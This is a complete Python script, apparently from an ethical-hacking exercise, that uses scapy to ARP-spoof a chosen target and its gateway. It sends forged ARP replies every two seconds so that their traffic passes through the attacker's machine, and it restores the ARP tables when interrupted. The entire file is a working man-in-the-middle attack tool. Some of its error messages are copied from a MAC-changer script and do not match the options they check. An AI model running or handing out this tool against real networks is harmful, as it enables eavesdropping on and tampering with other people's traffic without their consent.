#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Specify The Target")
    parser.add_option("-s", "--source", dest="gateway_ip", help="Specify The Gateway")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Specify The Interface, --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Specify The New MAC, --help for more info")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # setting the op=2 because we want to send a arp response not a request
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # setting the op=2 because we want to send a arp response not a request
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .......... Resetting ARP TABLES.... Please Wait\n")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    print("[+] DONE")
